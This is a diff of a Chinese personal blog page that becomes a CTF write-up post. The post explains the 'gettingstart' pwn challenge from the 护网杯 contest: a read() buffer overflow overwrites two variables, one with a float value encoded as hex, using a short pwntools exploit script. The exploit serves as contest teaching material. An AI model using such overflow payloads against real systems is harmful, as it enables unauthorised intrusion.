@@ -180,189 +180,228 @@
     </nav>
 </header>
 
-<div class="bg-cover about-cover" style="background-image: url('/medias/cover.jpg')">
+
+
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
     <div class="container">
         <div class="row">
-            <div class="col s10 offset-s1 m8 offset-m2 l8 offset-l2">
+            <div class="col s12 m12 l12">
                 <div class="brand">
-                    <div class="title center-align">
-                    
-                        Yof3ng
-                    
-                    </div>
-
-                    <div class="description center-align">
-                    
-                        所有的幸福后面,都有人在负重前行.
-                    
+                    <div class="description center-align post-title">
+                        Pwn-10月
                     </div>
                 </div>
             </div>
         </div>
     </div>
 </div>
-
-<script>
-// Dynamically switch banner pictures every day.
-$('.bg-cover').css('background-image', 'url(/medias/banner/' + new Date().getDay() + '.jpg)');
-</script>
 
 <main class="content">
-
-    
-
-<div id="category-cloud" class="container chip-container">
-    <div class="card">
-        <div class="card-content">
-            <div class="tag-title center-align">文章分类</div>
-            <div class="tag-chips">
+	
+    <!-- 文章内容详情 -->
+    <div id="artDetail" class="container">
+			
+        <div class="card">
+            <div class="card-content article-info">
                 
+                <div class="article-tag">
+                    
+                    <a href="/tags/Pwn/" target="_blank"><span class="chip bg-color">Pwn</span></a>
+                    
+                </div>
                 
-                
-                <a href="/categories/CTF/" title="CTF: 1">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            style="background-color: #F9EBEA;">CTF
-                        <span class="tag-length">1</span>
+                <div class="post-info">
+					
+                    
+					
+                    <span class="post-cate">
+                    <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+						
+                        <a href="/categories/CTF/" class="post-category" target="_blank">
+                        CTF
+                        </a>
+                        
                     </span>
-                </a>
-                
-                
-                <a href="/categories/杂文/" title="杂文: 2">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            style="background-color: #F5EEF8;">杂文
-                        <span class="tag-length">2</span>
+                    
+						
+                    <span class="post-date">
+                        <i class="fa fa-clock-o fa-fw"></i>2018-10-13
                     </span>
-                </a>
-                
-                
-                <a href="/categories/数学建模/" title="数学建模: 5">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            style="background-color: #D5F5E3;">数学建模
-                        <span class="tag-length">5</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/算法/" title="算法: 2">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-active "
-                            style="background-color: #E8F8F5;">算法
-                        <span class="tag-length">2</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/渗透/" title="渗透: 1">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            style="background-color: #FEF9E7;">渗透
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
+					
+                </div>
             </div>
-        </div>
-    </div>
+            <hr>
+            <div class="card-content article-card-content">
+			<ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Pwn-10-13"><span class="post-toc-text">Pwn-10/13</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#gettingstart"><span class="post-toc-text">gettingstart</span></a></li></ol></li></ol>
+                <div id="articleContent">
+                    <p>[TOC]</p>
+<h1 id="Pwn-10-13"><a href="#Pwn-10-13" class="headerlink" title="Pwn-10/13"></a>Pwn-10/13</h1><blockquote>
+<p>​    今天打了护网杯，从之前的强网杯，到国赛，到铁三，到Xman，再到网鼎杯，最后到了今天的护网杯，经历的比赛倒是挺多，只是进步微乎其微，实在汗颜，希望接下来能有较大的进步！</p>
+</blockquote>
+<h2 id="gettingstart"><a href="#gettingstart" class="headerlink" title="gettingstart"></a>gettingstart</h2><blockquote>
+<p>​    这相当于今天pwn的签到题，简单但详细地复原一下：</p>
+<p>​    第一步，IDA看一看，逻辑十分简单，甚至可以直接写payload：</p>
+<p><img src="https://i.loli.net/2018/10/13/5bc20e49c32cb.png" alt=""></p>
+<p>​    突破点是通过read函数，在buf处进行溢出，进而覆盖v7，v8的值，达到else的条件，即v7==0x7FFFFFFFFFFFFFFF,v8==0.1。</p>
+<p>​    这里我们需要知道的是，浮点数在内存中表现的形式是什么样子的，它与普通的整型不同，会做出转换，比较晦涩。这里简单写一个C语言程序看看0.1是怎么表示的：</p>
+<pre class=" language-c"><code class="language-c">
+</code></pre>
+<p>​    通过<code>gcc -o test test.c -z noexecstack -no-pie</code>进行编译，然后使用gdb看看：</p>
+<p><img src="https://i.loli.net/2018/10/13/5bc213eed9cfc.png" alt=""></p>
+<p>​    显而易见，0.1是用0x3fb999999999999a表示的，那么在接下来的exp中就应该这样写:</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./task"</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#p=remote("117.78.26.114",31498)</span>
+payload<span class="token operator">=</span><span class="token string">""</span>
+payload<span class="token operator">+=</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x7FFFFFFFFFFFFFFF</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x3FB999999999999A</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#cmd="cat flag"</span>
+<span class="token comment" spellcheck="true">#print p.recv()</span>
+<span class="token comment" spellcheck="true">#print payload</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+<span class="token keyword">print</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#p.send(cmd)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#print p.recv()</span>
+</code></pre>
+<p>运行exp，效果图：</p>
+<p><img src="https://i.loli.net/2018/10/13/5bc214f6668a4.png" alt=""></p>
+</blockquote>
+<p>加油！</p>
+
+                </div>
+                <hr/>
+			
+                <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
 </div>
 
-    
+<script src="/libs/share/js/social-share.min.js"></script>
 
-    <article id="articles" class="container articles">
-        <div class="row tags-posts">
-            
-            <div class="article tag-post col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2018/10/07/数据结构和算法-day2/">
-                        <div class="card-image tag-image">
-                            
-                            <img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1539066969226&amp;di=d0ecf508fdab9370a396a5a6297a0bdb&amp;imgtype=0&amp;src=http%3A%2F%2Fimg.zcool.cn%2Fcommunity%2F0117e2571b8b246ac72538120dd8a4.jpg%401280w_1l_2o_100sh.jpg" class="responsive-img" alt="数据结构和算法-day2">
-                            
-                            <span class="card-title">数据结构和算法-day2</span>
-                        </div>
-                    </a>
-                    <div class="card-content article-content">
-                        <div class="summary">[TOC]
-数据结构和算法 （Algorithm）- 线性结构&nbsp; &nbsp; &nbsp; &nbsp; 线性结构的基本特征是：</div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-10-07
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fa fa-bookmark fa-fw icon-category"></i>
-                                
-                                <a href="/categories/算法/" class="post-category" target="_blank">
-                                    算法
-                                </a>
-                                
-                                
-                            </span>
-                        </div>
-                    </div>
-
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/算法/" target="_blank">
-                            <span class="chip bg-color">算法</span>
-                        </a>
-                        
-                    </div>
-                    
+                <div class="reprint">
+                    <p>
+					
+                        <span class="reprint-tip">转载请注明: </span>
+                        <a href="http://www.yof3ng.xyz" class="b-link-green">肖亦枫's Blog | 热爱分享</a>
+                        <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                        <a href="/2018/10/13/Pwn-10月/" class="b-link-green">Pwn-10月</a>
+                    </p>
                 </div>
             </div>
-            
-            <div class="article tag-post col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2018/10/07/数据结构和算法-day1/">
-                        <div class="card-image tag-image">
-                            
-                            
-                            <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="数据结构和算法-day1">
-                            
-                            <span class="card-title">数据结构和算法-day1</span>
-                        </div>
-                    </a>
-                    <div class="card-content article-content">
-                        <div class="summary">[TOC]
-数据结构和算法 （Algorithm）- 绪论数据是个啥？ &nbsp; &nbsp; &nbsp; 数据（data）是信息的载</div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-10-07
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fa fa-bookmark fa-fw icon-category"></i>
-                                
-                                <a href="/categories/算法/" class="post-category" target="_blank">
-                                    算法
-                                </a>
-                                
-                                
-                            </span>
-                        </div>
-                    </div>
-
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/算法/" target="_blank">
-                            <span class="chip bg-color">算法</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-            
         </div>
-    </article>
-</main>
 
+        
+
+        
+
+        
+
+<article id="articles" class="container prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">本篇</div>
+            <div class="card">
+                <a href="/2018/10/13/Pwn-10月/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="Pwn-10月">
+                        
+                        <span class="card-title">Pwn-10月</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">[TOC]
+Pwn-10/13
+​    今天打了护网杯，从之前的强网杯，到国赛，到铁三，到Xman，再到网鼎杯，最后到了今天的护网杯，经历的比赛倒是挺多，只是进步微乎其微，实在汗颜，希望接下来能有较大的进步！
+
+gettingstart
+</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-10-13
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Pwn/" target="_blank">
+                        <span class="chip bg-color">Pwn</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">下一篇</div>
+            <div class="card">
+                <a href="/2018/10/13/数学建模-day5/">
+                    <div class="card-image">
+                        
+                        <img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1540039782&amp;di=1f2a7693a843ded05cbe3be4abc5c6ef&amp;imgtype=jpg&amp;er=1&amp;src=http%3A%2F%2Fg.hiphotos.baidu.com%2Fbaike%2Fc0%253Dbaike60%252C5%252C5%252C60%252C20%253Bt%253Dgif%2Fsign%3De731d2d8972bd40756cadbaf1ae0f534%2Fb3119313b07eca808b2d7517912397dda1448312.jpg" class="responsive-img" alt="数学建模-day5">
+                        
+                        <span class="card-title">数学建模-day5</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">[TOC]
+数学建模_day5 - 线性代数
+​    线性代数相信大家都学过哒，基本是大学的理科必修课，而线性代数常用于工程数学，自然而然就和数学建模有很大的关系啦，今天学习一下用matlab做一些相关的线性代数学习。
+
+矩阵
+​    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-10-13
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/数学建模/" class="post-category" target="_blank">
+                                    数学建模
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/数模/" target="_blank">
+                        <span class="chip bg-color">数模</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+    </div>
+</main>
 
 <footer class="page-footer bg-color">
     <div class="container row center-align">
